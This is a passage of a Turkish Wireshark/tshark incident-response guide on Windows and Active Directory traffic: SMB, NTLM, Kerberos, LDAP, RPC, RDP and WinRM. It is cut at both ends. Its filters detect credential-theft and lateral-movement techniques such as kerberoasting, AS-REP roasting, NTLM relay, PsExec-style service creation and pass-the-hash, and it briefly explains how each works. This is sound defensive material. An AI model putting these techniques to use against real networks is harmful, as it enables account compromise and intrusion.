- **Domain fronting**: Meşru bir alanın arkasına saklanıp CDN üzerinden farklı bir arka uca ulaşma.
- **CDN**: İçerik dağıtım ağı.

> **Anlık karar:** Kanıt "SNI ≠ Host". Bunu görmeden kesin hüküm verme.


</details>

<details>
<summary><strong>150 · TLS çözüldükten sonra HTTP içeriğini dışa aktarmak</strong></summary>

**Metafor:** Kilidi açtıktan sonra zarfın içindekileri tek tek arşive koymak.

**Senden istenen:** "Çözülmüş trafikteki dosyayı/flag'i çıkar."

**Filtreler (araştırma yolu):**

- `tls && http.request` → çözülmüş HTTP istekleri
- `http2.headers.path` → çözülmüş HTTP/2 istek yolları
- `http.content_type contains "application" && tls` → çözülmüş trafikte uygulama dosyaları

**Menü / araç:**

- Keylog ekledikten sonra File ▸ Export Objects ▸ HTTP → artık HTTPS içindeki dosyalar da listelenir
- Follow ▸ HTTP Stream / HTTP/2 Stream → çözülmüş istek-cevap

**Filtreden sonra yol tarifi:**

1. Önce keylog ile çözümü doğrula (paket listesinde HTTP/HTTP2 protokolleri görünmeli).
2. Export Objects ▸ HTTP'yi aç; HTTP/2 dosyaları da (Wireshark 3.x+) bu listede görünür.
3. Gerekirse Follow ▸ TLS Stream ▸ Raw ile içeriği kaydet ve başlıkları elle temizle.
4. Çıkarılan dosyaların hash'ini al ve kanıt listesine ekle.

**Terimler:**

- **Decrypted TLS**: Wireshark alt panelinde çözülmüş byte'ların gösterildiği sekme.

> **Anlık karar:** Export listesi boşsa çözüm çalışmamıştır. Önce protokol sütununa bak, "TLSv1.3" yazıyorsa hâlâ şifrelidir.


</details>

## G · Windows ve Active Directory Olay İncelemesi: SMB, NTLM, Kerberos, LDAP, RPC, RDP

*Kurumsal ağın sinir sistemi. Bir olaydan sonra kayıtta "hangi hesap nereye bağlandı, hangi dosya açıldı, hangi oturum başarılı oldu" sorularını yanıtlarsın. Hepsi savunma/adli inceleme bakışıyla: trafiği okumak, saldırı yapmak değil.*

<details>
<summary><strong>151 · SMB ile hangi dosyalara erişildi?</strong></summary>

**Metafor:** Bir arşiv odasının giriş defteri: kim girdi, hangi klasörü açtı, neyi aldı.

**Senden istenen:** "İncelenen oturumda hangi paylaşıma bağlanıldı, hangi dosyalar okundu/yazıldı?"

**Filtreler (araştırma yolu):**

- `smb2.cmd == 3` → Tree Connect (paylaşıma bağlanma)
- `smb2.cmd == 5` → Create (dosya açma/oluşturma)
- `smb2.filename` → dosya adı içeren SMB2 paketleri
- `smb2.cmd == 8` → Read (okuma)
- `smb2.cmd == 9` → Write (yazma)

**Menü / araç:**

- File ▸ Export Objects ▸ SMB → aktarılan dosyaların listesi

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'smb2.cmd == 5 && smb2.flags.response == 0' -T fields -e frame.time_utc -e ip.src -e smb2.filename
```

**Filtreden sonra yol tarifi:**

1. Tree Connect'leri filtrele ve smb2.tree sütununu ekle; bağlanılan paylaşımlar (C$, ADMIN$, IPC$, kullanıcı paylaşımları) görünür.
2. Create isteklerinden erişilen dosya adlarını listele.
3. Read/Write komutlarıyla okunan ve yazılan dosyaları ayır.
4. Gizli yönetim paylaşımlarına (ADMIN$, C$) dosya yazılması incelemede öncelikli not edilir; uzaktan çalıştırma hazırlığının izi olabilir.

**Terimler:**

- **SMB**: Windows dosya ve yazıcı paylaşım protokolü (TCP 445).
- **Tree Connect**: Bir paylaşıma bağlanma işlemi.
- **ADMIN$ / C$ / IPC$**: Windows'un gizli yönetim paylaşımları.

> **Anlık karar:** Yönetim paylaşımına çalıştırılabilir dosya yazılması, inceleme zaman çizelgesinde kırmızı işaretlenir.


</details>

<details>
<summary><strong>152 · SMB üzerinden aktarılan dosyayı adli olarak çıkarmak</strong></summary>

**Metafor:** Arşivden kopyalanan belgenin bir fotokopisini de kanıt klasörüne koymak.

**Senden istenen:** "SMB ile aktarılan dosyayı çıkar, hash'ini al."

**Filtreler (araştırma yolu):**

- `smb2.write_length > 0` → veri yazılan SMB2 paketleri
- `smb2.read_length > 0` → veri okunan SMB2 paketleri
- `smb2.filename contains ".exe"` → çalıştırılabilir dosya adları

**Menü / araç:**

- File ▸ Export Objects ▸ SMB → dosya adı, boyut, bütünlük durumu; Save

**Filtreden sonra yol tarifi:**

1. Export Objects ▸ SMB penceresini aç; dosyalar paket sırasına göre listelenir.
2. "FILE (partial)" ibaresi dosyanın tamamının kayıtta olmadığını gösterir; hash karşılaştırması o zaman güvenilmez.
3. Dosyayı izole klasöre kaydet, sha256sum ile hash al ve kanıt listesine ekle.
4. SMB3 şifrelemesi açıksa içerik görünmez; yalnızca dosya adları ve meta veri değerlendirilir.

**Terimler:**

- **Export Objects SMB**: Okuma/yazma işlemlerinden dosyayı yeniden birleştirme.
- **SMB3 encryption**: SMB trafiğinin uçtan uca şifrelenmesi.

> **Anlık karar:** "partial" dosyada hash yanıltır. Tam aktarım değilse raporda açıkça belirt.


</details>

<details>
<summary><strong>153 · SMB'de başarısız oturum açma dalgası</strong></summary>

**Metafor:** Arşiv kapısında yanlış kartlarla üst üste deneme yapılması; defterde bir sürü "reddedildi" satırı.

**Senden istenen:** "Çok sayıda başarısız SMB oturum açma var mı, hangi hesaplar, sonunda başarılı olan oldu mu?"

**Filtreler (araştırma yolu):**

- `smb2.cmd == 1` → Session Setup (oturum açma)
- `smb2.nt_status == 0xc000006d` → STATUS_LOGON_FAILURE
- `smb2.nt_status == 0xc0000234` → STATUS_ACCOUNT_LOCKED_OUT
- `smb2.cmd == 1 && smb2.nt_status == 0x00000000 && smb2.flags.response == 1` → başarılı oturum açma cevabı

**Filtreden sonra yol tarifi:**

1. Session Setup'ları filtrele ve smb2.nt_status sütununu ekle.
2. Çok sayıda LOGON_FAILURE art arda = parola deneme dalgası. Aynı hesap farklı denemeler mi, çok hesap aynı anda mı, ayırt et.
3. STATUS_SUCCESS dönen Session Setup, başarılı olan oturumdur; o andan sonrasını takip et.
4. Hesap kilitlenme kodu (0xc0000234) kullanıcı şikâyetiyle de eşleşebilir; zaman çizelgesine ekle.

**Terimler:**

- **NT Status**: Windows işlem sonucu kodu (0 = başarı).
- **0xc000006d**: Logon failure. 0xc0000234 = Account locked out. 0xc0000072 = Account disabled.

> **Anlık karar:** Durum kodlarını cümle gibi oku: 6d, 6d, 6d, 00 = "başarısız, başarısız, başarısız, girildi".


</details>

<details>
<summary><strong>154 · NTLM kimlik doğrulamasından hesap ve makine adını okumak</strong></summary>

**Metafor:** Kapıdaki görevliye gösterilen kimlik kartından ad ve kurumu not etmek.

**Senden istenen:** "Hangi kullanıcı, hangi domain, hangi makineden oturum açtı?"

**Filtreler (araştırma yolu):**

- `ntlmssp.messagetype == 0x00000003` → NTLM AUTHENTICATE mesajı
- `ntlmssp.auth.username` → kullanıcı adı
- `ntlmssp.auth.domain` → domain adı
- `ntlmssp.auth.hostname` → istemci makine adı

**Komut satırı:**

```bash
tshark -r kanit.pcapng -Y 'ntlmssp.messagetype == 0x00000003' -T fields -e frame.time_utc -e ip.src -e ip.dst -e ntlmssp.auth.domain -e ntlmssp.auth.username -e ntlmssp.auth.hostname
```

**Filtreden sonra yol tarifi:**

1. NTLM üç mesajlıdır: NEGOTIATE (1) → CHALLENGE (2) → AUTHENTICATE (3). Ad bilgileri 3. mesajdadır.
2. AUTHENTICATE paketlerini filtrele, kullanıcı/domain/hostname sütunlarını ekle.
3. tshark ile "zaman - kaynak - hedef - domain - kullanıcı - makine" tablosunu çıkar; bu senin kimlik zaman çizelgen olur.
4. Beklenmedik eşleşmeleri işaretle: bir hesabın normalde kullanmadığı bir makineden görünmesi gibi.

**Terimler:**

- **NTLM**: Windows'un soru-cevap tabanlı kimlik doğrulaması.
- **NTLMSSP**: NTLM'nin ağ üzerindeki taşıma formatı.
- **Challenge-response**: Sunucu rastgele sayı yollar, istemci bunu parolasıyla işler; parola düz halde ağda gitmez.

> **Anlık karar:** NTLM pek çok protokolün içinde taşınır (SMB, HTTP, RPC). ntlmssp.auth.username filtresi hepsini tek seferde toplar.


</details>

<details>
<summary><strong>155 · NTLM relay belirtileri</strong></summary>

**Metafor:** Birinin elindeki kimlik kartını hiç değiştirmeden başka bir kapıda kullanıp o kapıyı açtırması.

**Senden istenen:** "Bir makineye gelen kimlik doğrulaması, aynı anda başka bir hedefe mi iletiliyor?"

**Filtreler (araştırma yolu):**

- `ntlmssp.ntlmserverchallenge` → sunucunun gönderdiği challenge değeri
- `ntlmssp.ntlmserverchallenge == 1122334455667788` → test/araç ortamlarında sık görülen sabit challenge
- `ntlmssp.messagetype == 0x00000002` → CHALLENGE mesajları

**Filtreden sonra yol tarifi:**

1. Challenge değerini sütun yap; aynı challenge'ın iki ayrı bağlantıda görünmesi, bir oturumun başka hedefe iletildiğine (relay) işaret edebilir.
2. Bir iç host hem kimlik doğrulaması alıp hem de o doğrulamayı başka bir hedefe hemen ileten bir aracı gibi davranıyor mu bak.
3. Zaman damgalarını karşılaştır: gelen CHALLENGE ile giden AUTHENTICATE neredeyse eşzamanlıysa relay olasılığı artar.
4. SMB imzalama (signing) zorunlu değilse relay mümkündür; bulguyu yapılandırma zafiyeti olarak da not et.

**Terimler:**

- **NTLM relay**: Yakalanan bir kimlik doğrulamasının değiştirilmeden başka bir hedefe iletilmesi.
- **SMB signing**: SMB paketlerinin imzalanması; relay'i büyük ölçüde engeller.

> **Anlık karar:** Aynı challenge iki yerde + eşzamanlı akış = relay şüphesi. Kesinleştirmek için uç nokta loglarıyla eşleştir.


</details>

<details>
<summary><strong>156 · Kerberos ön kimlik doğrulama hataları</strong></summary>

**Metafor:** Resmî bilet gişesinde yanlış kimlikle bilet almaya çalışıp reddedilmek; gişe defterine "red" düşülür.

**Senden istenen:** "Kerberos üzerinden başarısız kimlik doğrulama var mı, hangi hesaplar?"

**Filtreler (araştırma yolu):**

- `kerberos.msg_type == 10` → AS-REQ (bilet isteği)
- `kerberos.msg_type == 30` → KRB-ERROR (hata cevabı)
- `kerberos.error_code == 24` → KDC_ERR_PREAUTH_FAILED (ön kimlik doğrulama başarısız: yanlış parola)
- `kerberos.error_code == 6` → KDC_ERR_C_PRINCIPAL_UNKNOWN (kullanıcı yok)
- `kerberos.CNameString` → hesap adı

**Filtreden sonra yol tarifi:**

1. KRB-ERROR paketlerini filtrele, error_code ve CNameString sütunlarını ekle.
2. Error code 24 (yanlış parola) üst üste = parola deneme dalgası. Error code 6 (kullanıcı yok) üst üste = kullanıcı adı taraması.
3. Hangi hesapların hedef alındığını listele; var olmayan hesap hataları saldırganın kullanıcı listesini doğruladığını gösterir.
4. Sonunda başarılı AS-REP (msg_type 11) gelen hesabı bul.

**Terimler:**

- **Kerberos**: AD'nin bilet tabanlı kimlik doğrulama protokolü (TCP/UDP 88).
- **KDC**: Key Distribution Center; biletleri veren domain controller rolü.
- **AS-REQ / AS-REP**: Kimlik doğrulama isteği / cevabı.

> **Anlık karar:** Error 24 = parola yanlış ama hesap var. Error 6 = hesap yok. İkisinin dağılımı saldırının keşif mi deneme mi olduğunu söyler.


</details>

<details>
<summary><strong>157 · AS-REP roasting belirtileri</strong></summary>

**Metafor:** Gişede ön kimlik gerektirmeyen biletlerin, sahibi orada olmadan basılabilmesi; o biletler sonradan çevrimdışı incelenebilir.

**Senden istenen:** "Ön kimlik doğrulaması kapalı hesaplar hedeflenmiş mi?"

**Filtreler (araştırma yolu):**

- `kerberos.msg_type == 11` → AS-REP cevapları
- `kerberos.msg_type == 10 && !kerberos.padata_type` → ön kimlik doğrulama verisi (padata) taşımayan AS-REQ'ler
- `kerberos.error_code == 25` → KDC_ERR_PREAUTH_REQUIRED

**Filtreden sonra yol tarifi:**

1. AS-REQ'lerde ön kimlik doğrulama (PA-ENC-TIMESTAMP) verisi olup olmadığına bak; olmadan AS-REP alınabiliyorsa o hesapta ön doğrulama kapalıdır.
2. Kısa sürede çok sayıda hesap için bu tür istek = AS-REP roasting denemesi.
3. Dönen AS-REP'lerin şifreleme türünü (etype) not et; zayıf türler (RC4, etype 23) incelemede ayrıca işaretlenir.
4. Hedeflenen hesapları listele ve bunların ön doğrulamasının neden kapalı olduğunu yapılandırma incelemesine ekle.

**Terimler:**

- **AS-REP roasting**: Ön kimlik doğrulaması kapalı hesapların biletinin istenip çevrimdışı incelenebildiği teknik.
- **Pre-authentication**: İstemcinin bilet almadan önce parolasını kanıtlaması.
- **etype**: Kerberos şifreleme türü (17/18 AES, 23 RC4).

> **Anlık karar:** Ön doğrulamasız AS-REQ + çok hesap = roasting keşfi. Çözüm: hesaplarda ön doğrulamayı aç.


</details>

<details>
<summary><strong>158 · Kerberoasting (servis bileti isteme dalgası)</strong></summary>

**Metafor:** Bir binadaki tüm servis odalarının anahtar kalıplarının çıkarılıp sonra çevrimdışı incelenmesi.

**Senden istenen:** "Servis hesaplarının biletleri topluca mı istenmiş?"

**Filtreler (araştırma yolu):**

- `kerberos.msg_type == 12` → TGS-REQ (servis bileti isteği)
- `kerberos.msg_type == 13` → TGS-REP (servis bileti cevabı)
- `kerberos.SNameString` → istenen servisin adı (SPN)
- `kerberos.etype == 23` → RC4 ile şifrelenmiş bilet istekleri

**Filtreden sonra yol tarifi:**

1. TGS-REQ'leri filtrele ve SNameString sütununu ekle; kısa sürede çok sayıda farklı servis için bilet isteği = kerberoasting adayı.
2. Özellikle etype 23 (RC4) isteklerine dikkat; incelemede zayıf şifreleme biletleri öncelikli işaretlenir.
3. İstekleri yapan tek bir kaynak hesabı/makineyi belirle.
4. Hangi servis hesaplarının hedeflendiğini listele ve uç nokta ekibiyle paylaş (parola değişimi önerilir).

**Terimler:**

- **Kerberoasting**: Servis hesaplarının biletini isteyip çevrimdışı incelemeye yönelik teknik.
- **SPN**: Service Principal Name; bir servisin AD'deki adı.
- **TGS**: Ticket Granting Service; servis biletlerini veren aşama.

> **Anlık karar:** Tek bir hesaptan dakikalar içinde onlarca farklı SPN için TGS-REQ = kerberoasting imzası.


</details>

<details>
<summary><strong>159 · Golden/Silver ticket ve anormal bilet belirtileri</strong></summary>

**Metafor:** Gişe kaydında olmayan ama elde kusursuz görünen bir biletin ortaya çıkması.

**Senden istenen:** "Normal AS/TGS akışına uymayan bilet kullanımı var mı?"

**Filtreler (araştırma yolu):**

- `kerberos.msg_type == 14` → AP-REQ (bilet sunumu)
- `kerberos.msg_type == 14 && !kerberos.msg_type == 12` → öncesinde TGS-REQ görülmeyen bilet sunumları
- `kerberos.etype == 23` → RC4 biletler (modern ağlarda AES beklenir)

**Filtreden sonra yol tarifi:**

1. Servis erişimlerinde (AP-REQ) kullanılan biletin, kayıtta bir AS-REQ/TGS-REQ zincirinden gelip gelmediğine bak.
2. Hiç bilet isteği görülmeden kusursuz bir bilet sunulması, biletin kayıt dışı üretildiğine işaret edebilir.
3. AES bekleyen bir ortamda RC4 (etype 23) bilet kullanımı anomali olarak işaretlenir.
4. Bu alanda ağ tek başına yeterli değildir; DC olay loglarıyla (4769, 4624) birlikte değerlendir.

**Terimler:**

- **Golden/Silver ticket**: Kayıt dışı üretilmiş Kerberos biletleri.
- **AP-REQ**: Bir servise bilet sunma mesajı.

> **Anlık karar:** Ağ kanıtı burada "ipucu" seviyesindedir; kesin hüküm için domain controller logları şart. Raporda bu sınırı belirt.


</details>

<details>
<summary><strong>160 · LDAP ile dizin keşfi</strong></summary>

**Metafor:** Şirket rehberinin tamamını, kim kimdir listesini, kimin hangi yetkiye sahip olduğunu masa masa dolaşıp not almak.

**Senden istenen:** "Saldırgan AD'yi (kullanıcılar, gruplar, bilgisayarlar) sorgulayarak keşif yaptı mı?"

**Filtreler (araştırma yolu):**

- `ldap.protocolOp == 3` → searchRequest (dizin arama)
- `ldap.filter` → arama filtresinin içeriği
- `ldap.baseObject` → aramanın başladığı dizin kökü
- `ldap.protocolOp == 3 && ldap.assertionValue contains "objectClass"` → objectClass filtresi içeren geniş aramalar

**Filtreden sonra yol tarifi:**

1. searchRequest'leri filtrele ve ldap.filter sütununu ekle.
2. Çok geniş filtreler (objectClass=*, (&(objectClass=user)) gibi) tüm dizini çekme girişimidir; BloodHound/SharpHound gibi araçların izidir.
3. Hangi nesnelerin arandığına bak: servicePrincipalName sorguları kerberoasting hazırlığı, admin grubu sorguları yetki haritalama olabilir.
4. Kaynak hesabı ve zamanı not et; genelde kısa sürede çok sayıda sorgu gelir.

**Terimler:**

- **LDAP**: AD'nin dizin sorgulama protokolü (TCP 389, TLS için 636).
- **Search filter**: Hangi nesnelerin isteneceğini belirleyen ifade.
- **BloodHound**: AD ilişkilerini haritalayan keşif aracı.

> **Anlık karar:** Kısa sürede yüzlerce LDAP searchRequest, bir insanın rehber gezmesi değildir. Otomatik keşif imzasıdır.


</details>

<details>
<summary><strong>161 · LDAP oturum açma ve düz metin bind</strong></summary>

**Metafor:** Rehber odasına girerken görevliye parolayı açıkça söylemek; yan masadaki herkes duyar.

**Senden istenen:** "LDAP üzerinden kimlik bilgisi şifresiz mi gönderilmiş?"

**Filtreler (araştırma yolu):**

- `ldap.protocolOp == 0` → bindRequest (oturum açma)
- `ldap.authentication == 0` → simple authentication (düz metin parola)
- `ldap.name` → bind sırasında kullanılan kullanıcı DN'i
- `ldap.resultCode == 49` → invalidCredentials (başarısız giriş)

**Filtreden sonra yol tarifi:**

1. bindRequest'leri filtrele; simple bind (düz metin) kullanılıyorsa parola pakette açıkça görünür.
2. ldap.name ile bağlanan kullanıcıyı (DN) oku.
3. resultCode 49 başarısız, 0 başarılı girişi gösterir; başarısız dalgası brute force olabilir.
4. Şifresiz LDAP bind başlı başına bir yapılandırma zafiyetidir; LDAPS (636) kullanılmalı. Raporla.

**Terimler:**

- **Bind**: LDAP'ta kimlik doğrulama (oturum açma) işlemi.
- **Simple bind**: Parolanın düz metin (base64 değil, açık) gönderildiği yöntem.
- **DN**: Distinguished Name; dizindeki tam adres (CN=Ali,OU=IT,DC=sirket,DC=local).

> **Anlık karar:** Simple bind + 389 portu = parola ağda açık. Bu, incelemede hem olay hem zafiyet olarak çift kayıt edilir.


</details>

<details>
<summary><strong>162 · DCE/RPC ile uzaktan yönetim çağrıları</strong></summary>

**Metafor:** Bir binada telefonla "şu odanın kapısını aç", "şu kaydı değiştir" gibi uzaktan talimatlar verilmesi; santral kayıtlarından hangi talimatın verildiği okunur.

**Senden istenen:** "Uzaktan yordam çağrılarıyla hangi yönetim işlemleri yapıldı?"

**Filtreler (araştırma yolu):**

- `dcerpc.cn_bind_to_uuid` → hangi RPC arayüzüne bağlanıldığı
- `dcerpc.opnum` → çağrılan işlemin numarası
- `dcerpc.pkt_type == 11` → Bind paketleri
- `dcerpc.pkt_type == 0` → Request paketleri

**Filtreden sonra yol tarifi:**

1. Bind paketlerindeki arayüz UUID'sine bak; hangi servisin kullanıldığını söyler (svcctl = servis yönetimi, atsvc/tsch = zamanlanmış görev, samr/lsarpc = hesap/politika sorgusu, drsuapi = dizin çoğaltma).
2. opnum değerleriyle hangi işlemin çağrıldığını belirle (ör. svcctl CreateService, StartService).
3. Servis oluşturma veya zamanlanmış görev ekleme çağrıları uzaktan çalıştırma/kalıcılık izleridir.
4. Kaynak hesabı ve hedef makineyi eşleştirip zaman çizelgesine ekle.

**Terimler:**

- **DCE/RPC**: Windows'un uzaktan yordam çağrısı altyapısı (genelde TCP 135 + dinamik port, veya SMB üzerinden).
- **UUID**: Her RPC arayüzünü tanımlayan benzersiz kimlik.
- **opnum**: Arayüz içindeki işlem numarası.

> **Anlık karar:** RPC Bind UUID'si "hangi yetenek kullanıldı"yı, opnum "tam olarak ne yapıldı"yı söyler. İkisini birlikte oku.


</details>

<details>
<summary><strong>163 · Uzaktan servis oluşturma (PsExec benzeri) izleri</strong></summary>

**Metafor:** Bir binaya uzaktan telefon edip "şu yeni görevliyi işe al ve hemen çalıştır" dedirtmek; sonra o görevli içeride iş yapar.

**Senden istenen:** "Uzaktan servis oluşturularak kod çalıştırma izi var mı?"

**Filtreler (araştırma yolu):**

- `dcerpc.cn_bind_to_uuid == 367abb81-9844-35f1-ad32-98f038001003` → svcctl (Service Control Manager) arayüzü
- `svcctl.opnum == 12` → CreateServiceW çağrısı
- `smb2.filename matches "PSEXESVC|\\.exe$" && smb2.cmd == 9` → ADMIN$'a servis ikilisi yazımı
- `smb2.tree contains "ADMIN$"` → yönetim paylaşımına erişim

**Filtreden sonra yol tarifi:**

1. ADMIN$ veya C$'a bir çalıştırılabilir yazıldığını bul (SMB Write).
2. Hemen ardından svcctl arayüzüne bağlanıp CreateService/StartService çağrısı var mı bak.
3. Oluşturulan servisin adını ve ikili dosya yolunu RPC parametrelerinden oku.
4. Zinciri birleştir: dosya yazıldı → servis oluşturuldu → servis başlatıldı → çıktı IPC$ üzerinden okundu. Bu klasik uzaktan çalıştırma akışıdır.

**Terimler:**

- **Service Control Manager (svcctl)**: Windows servislerini yöneten RPC arayüzü.
- **PsExec**: Uzaktan komut çalıştırmanın yaygın (meşru ve kötüye kullanılan) yolu.

> **Anlık karar:** "ADMIN$'a exe yazımı + yeni servis + servis başlatma" üçlüsü görürsen lateral movement neredeyse kesindir.


</details>

<details>
<summary><strong>164 · Zamanlanmış görev ve WMI ile uzaktan çalıştırma</strong></summary>

**Metafor:** Uzaktan telefonla "her sabah 9'da şu işi yaptırın" diye bir hatırlatma bıraktırmak.

**Senden istenen:** "Uzaktan zamanlanmış görev veya WMI ile iş çalıştırılmış mı?"

**Filtreler (araştırma yolu):**

- `dcerpc.cn_bind_to_uuid == 86d35949-83c9-4044-b424-db363231fd0c` → ITaskSchedulerService (tsch) arayüzü
- `dcerpc.cn_bind_to_uuid == 8a885d04-1ceb-11c9-9fe8-08002b104860` → IWbemServices (WMI) arayüzü

**Filtreden sonra yol tarifi:**

1. tsch/atsvc arayüzü bağlanıp görev oluşturma çağrısı yapıldıysa uzaktan zamanlanmış görev eklenmiştir.
2. WMI arayüzüne (IWbemServices) bağlanma + sonrasında dinamik portta trafik, uzaktan WMI çalıştırma izi olabilir.
3. Çağrının parametrelerinden çalıştırılan komut/yol okunabildiği kadar oku.
4. Bu teknikler kalıcılık ve çalıştırma içindir; uç nokta loglarıyla (görev oluşturma event'leri) doğrula.

**Terimler:**

- **Scheduled task**: Belirli zamanda çalışacak iş.
- **WMI**: Windows Management Instrumentation; uzaktan yönetim ve sorgulama altyapısı.

> **Anlık karar:** RPC Bind UUID'leri birer parmak izidir. svcctl, tsch, atsvc, drsuapi UUID'lerini kenara not et; incelemenin yarısını kısaltır.


</details>

<details>
<summary><strong>165 · RDP bağlantılarını incelemek</strong></summary>

**Metafor:** Uzaktaki birinin bir bilgisayarın başına geçip ekranını kullanması; girişte kendini tanıtan bilgileri okuyabilirsin, ama görüntü şifrelidir.

**Senden istenen:** "RDP ile kim, nereye bağlandı?", "Bağlantı başarılı mı?"

**Filtreler (araştırma yolu):**

- `tcp.port == 3389` → RDP trafiği
- `rdp.rt_cookie` → bağlantı cookie'si (genelde kullanıcı adı ipucu taşır: mstshash=...)
- `rdp.client.name` → bağlanan istemci makine adı
- `rdp.negReq.requestedProtocols` → istenen güvenlik seviyesi

**Filtreden sonra yol tarifi:**

1. 3389 trafiğini filtrele. İlk pakette (X.224 Connection Request) rt_cookie içinde "mstshash=KULLANICI" görülebilir; bağlanan kullanıcının ipucudur.
2. rdp.client.name ile kaynak istemci makine adını oku.
3. TLS'e geçildiyse görüntü içeriği şifrelidir; sadece bağlantı meta verisi ve zamanlama değerlendirilir.
4. Çok sayıda kısa 3389 bağlantısı = parola deneme; uzun tek bağlantı = etkileşimli oturum.

**Terimler:**

- **RDP**: Remote Desktop Protocol; uzak masaüstü (TCP 3389).
- **mstshash**: RDP cookie'sinde taşınan kullanıcı adı ipucu.
- **X.224**: RDP bağlantısının ilk kurulum katmanı.

> **Anlık karar:** RDP içeriği şifreli olsa da bağlantı öncesi cookie ve istemci adı sıklıkla düz metindir; "kim bağlandı" sorusuna ilk bakılan yer orasıdır.


</details>

<details>
<summary><strong>166 · İç ağda yanal hareketi izlemek</strong></summary>

**Metafor:** Bir ziyaretçinin binada oda oda dolaşması: önce resepsiyon, sonra muhasebe, sonra müdür odası. Giriş kartı kayıtları rotayı çıkarır.

**Senden istenen:** "Ele geçirilen makineden hangi iç makinelere, hangi protokollerle gidildi?"

**Filtreler (araştırma yolu):**

- `ip.src == 10.0.0.20 && (tcp.dstport in {445, 135, 3389, 5985, 5986, 22}) && tcp.flags.syn == 1 && tcp.flags.ack == 0` → bir hosttan yönetim portlarına giden bağlantılar
- `ip.src == 10.0.0.20 && !(ip.dst == 10.0.0.20) && (ip.dst == 10.0.0.0/8)` → o hosttan diğer iç hostlara trafik

**Filtreden sonra yol tarifi:**

1. Şüpheli ilk hosttan (hasta sıfır) çıkan, iç ağdaki başka makinelere giden yönetim portu bağlantılarını filtrele.
2. Hedef iç makineleri listele; her biri yeni bir "atlama" adayıdır.
3. Her atlamada kullanılan protokolü (SMB, RDP, WinRM/5985, SSH) ve hesabı not et.
4. Zinciri sırala: A → B → C. Bu, olayın yayılma haritasıdır ve izolasyon kararlarını belirler.

**Terimler:**

- **Lateral movement**: Ele geçirilen bir makineden diğer iç makinelere geçme.
- **WinRM**: Windows Remote Management (TCP 5985/5986); uzaktan PowerShell için kullanılır.

> **Anlık karar:** Yanal hareket, iç-iç yönetim portu trafiğinde gizlidir. İç ağda 445/3389/5985 bağlantılarını her zaman kim-kime diye çıkar.


</details>

<details>
<summary><strong>167 · WinRM / PowerShell Remoting trafiği</strong></summary>

**Metafor:** Uzaktan telefonla doğrudan komut dikte etmek; santral sadece "yönetim hattı kullanıldı" der, kelimeler şifreli olabilir.

**Senden istenen:** "Uzaktan PowerShell ile komut çalıştırılmış mı?"

**Filtreler (araştırma yolu):**

- `tcp.port == 5985` → WinRM HTTP
- `tcp.port == 5986` → WinRM HTTPS
- `http.request.uri contains "wsman"` → WS-Management uç noktası
- `http.request.method == "POST" && http.request.uri contains "wsman"` → komut taşıyan SOAP istekleri

**Filtreden sonra yol tarifi:**

1. 5985/5986 veya /wsman isteklerini filtrele.
2. HTTP (5985) ise gövde (SOAP/XML) kısmen okunabilir; şifreli (Negotiate/Kerberos) ise meta veriyle yetin.
3. POST isteklerinin boyutu ve sıklığı komut etkileşimini gösterir.
4. Kaynak ve hedefi yanal hareket haritasına ekle.

**Terimler:**

- **WinRM**: Uzaktan yönetim servisi.
- **WS-Management**: WinRM'in dayandığı SOAP tabanlı protokol.

> **Anlık karar:** 5985/5986'da trafik, kurumda uzaktan yönetim yapıldığını gösterir; kimin yaptığını hesapla (NTLM/Kerberos) eşleştir.


</details>

<details>
<summary><strong>168 · Pass-the-hash belirtileri (ağ perspektifinden)</strong></summary>

**Metafor:** Kimlik kartının kendisini değil, kartın bir kopyasını kullanıp kapı açtırmak; parola hiç söylenmez.

**Senden istenen:** "Parola girilmeden, yalnızca kimlik materyaliyle oturum açma belirtisi var mı?"

**Filtreler (araştırma yolu):**

- `ntlmssp.messagetype == 0x00000003` → NTLM AUTHENTICATE
- `ntlmssp.auth.username && smb2.cmd == 1` → SMB üzerinden NTLM oturum açma

**Filtreden sonra yol tarifi:**

1. Ağ kaydı tek başına pass-the-hash'i kesin kanıtlayamaz; parola girişini görmezsin zaten (NTLM parolayı hiç göndermez).
2. Dolaylı belirtiler: bir hesabın normalde oturum açmadığı makineden, mesai dışı, art arda birçok hedefe NTLM ile bağlanması.
3. Aynı hesabın kısa sürede çok sayıda makineye SMB/NTLM ile bağlanması yanal hareket desenidir.
4. Kesinleştirmek için uç nokta/DC loglarını (logon type 3, LogonProcessName) iste. Raporda ağ kanıtının sınırını belirt.

**Terimler:**

- **Pass-the-hash**: Parola yerine kimlik materyalinin doğrudan kullanılması.
- **Logon type 3**: Ağ üzerinden oturum açma (Windows olay logu kavramı).

> **Anlık karar:** Bu, ağdan "şüphe", uç noktadan "kanıt" olan bir konudur. İkisini ayrı yaz.


</details>

<details>
<summary><strong>169 · SMB sürüm düşürme ve eski protokol kullanımı</strong></summary>

**Metafor:** Yeni ve güvenli kapı varken ısrarla eski, kolay açılan kapıyı kullanmak.

**Senden istenen:** "Eski/zayıf SMB sürümü (SMBv1) kullanılmış mı?"

**Filtreler (araştırma yolu):**

- `smb` → SMBv1 trafiği (SMB2/3 ayrı protokoldür)
- `smb.cmd == 0x72` → SMBv1 Negotiate Protocol
- `smb2.dialect < 0x0300` → SMB 2.x (3.0 altı) kullanımı

**Filtreden sonra yol tarifi:**

1. Protocol Hierarchy'de "SMB" (v1) görünüyorsa eski protokol kullanılıyordur.
2. SMBv1 Negotiate paketlerini ve kullanan hostları listele.
3. SMBv1 bilinen kritik zafiyetlere (ör. solucan yayılımı) açıktır; kullanımı başlı başına bir risk bulgusudur.
4. Hangi iki makine arasında SMBv1 konuşulduğunu not et ve kapatılmasını öner.

**Terimler:**

- **SMBv1**: SMB'nin ilk, güvenlik açısından zayıf sürümü.
- **Dialect**: SMB sürüm anlaşması.

> **Anlık karar:** Protocol Hierarchy'de "SMB" (v1) satırı tek başına bir bulgu cümlesidir: "ağda SMBv1 hâlâ aktif".


</details>

<details>
<summary><strong>170 · NetBIOS/SMB ile paylaşım ve host keşfi</strong></summary>

**Metafor:** Bir kattaki tüm odaların kapılarındaki isim etiketlerini tek tek okuyup not almak.

**Senden istenen:** "Saldırgan ağdaki paylaşımları ve makineleri saydı mı?"

**Filtreler (araştırma yolu):**

- `smb2.cmd == 3 && smb2.tree contains "IPC$"` → IPC$ üzerinden sayım
- `browser` → Microsoft ağ gözatma (eski keşif)
- `nbns.flags.opcode == 0 && nbns.flags.response == 0` → NetBIOS isim sorguları

**Filtreden sonra yol tarifi:**

1. Kısa sürede çok sayıda farklı hosta IPC$ bağlantısı = paylaşım/oturum sayımı (net view, enum araçları).
